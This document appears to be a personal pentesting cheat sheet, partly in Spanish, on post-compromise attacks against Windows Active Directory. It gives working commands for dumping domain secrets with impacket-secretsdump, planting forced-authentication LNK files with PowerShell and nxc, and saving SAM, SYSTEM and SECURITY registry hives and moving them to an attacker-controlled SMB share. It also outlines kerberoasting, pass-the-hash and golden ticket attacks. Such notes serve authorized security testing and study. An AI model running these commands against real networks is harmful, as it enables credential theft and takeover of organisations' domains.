# Windows Active Directory Pentesting

## Post compromise attacks

- [kali impacket - secrets dump](https://www.kali.org/tools/impacket/)
    - `impacket-secretsdump DC.LOCAL/USER:'PASSWORD'@$IP`
    - running secretsdump as local:
        - `impacket-secrestsdump -sam sam.save -security security.save -system system.save LOCAL`
- [Kerberoasting](./kerberoasting.md)
- [ASREPRoasting](./ASREPRoasting.md)
    - [más material](https://tools.thehacker.recipes/impacket/examples/getuserspns.py)
    - Cuando comprometemos una cuenta, un ataque para empezar es este.
- Token impersonation attack
    - psexec
    - [mimikatz](./mimikatz.md)
    - [pypykatz](./pypykatz.md)
    - [Golden Ticket Attack](./goldenTicketAttack.md)
        - [Extra sids Attack](./extraSidsAttack.md)
    - [AddKeyCredentialLink/Shadow Credentials Attack](./addKeyCredentialLink.md)
    - [Backup Operator to Domain Admin](./backupOperatorToDomainAdmin.md)
    - [DPAPI Attack](./dpapiAttack.md)
- [LNK File Attacks](https://www.ired.team/offensive-security/initial-access/t1187-forced-authentication#execution-via-.rtf): `nxc smb 172.16.139.0/24 -u 'pthorpe' -p creds.txt -M slinky -o SERVER=172.16.139.10 NAME=urgent`
    - Código:

    ```powershell
    $objShell = New-Object -ComObject WScript.shell
    $lnk = $objShell.CreateShortcut("C:\test.lnk")
    $lnk.TargetPath = "\\192.168.138.149\@test.png"
    $lnk.WindowStyle = 1
    $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
    $lnk.Description = "Test"
    $lnk.HotKey = "Ctrl+Alt+T"
    $lnk.Save()
    ``` 

    - `smbserver.py -smb2support "icon" .`


### Post compromise attack strategy
- 1st
    - [kerberoasting](./kerberoasting.md)
    - [ASREPRoasting](./ASREPRoasting.md)
    - secretsdump
    - pass the hash
- 2nd: big deep
    - enum bloodhound
    - old vulns

### An other post compromise attack strategy
#### Attacking SAM
- [Security Account Manager](https://en.wikipedia.org/wiki/Security_Account_Manager)
##### Copying SAM Registry Hives
- hklm\sam
- hklm\system
- hklm\security
- We can create backups of these hives using the reg.exe utility.

#### Using reg.exe save to copy registry hives.
 ```
 C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

#### Creating a Share with impacket-smbserver
`impacket-smbserver -smb2support shareName someDir`

#### Moving hive copies to share
```
C:\> move sam.save \\YOUR_KALI_IP\CompData
        1 file(s) moved.

C:\> move security.save \\YOUR_KALI_IP\CompData
        1 file(s) moved.

C:\> move system.save \\YOUR_KALI_IP\CompData
        1 file(s) moved.
```
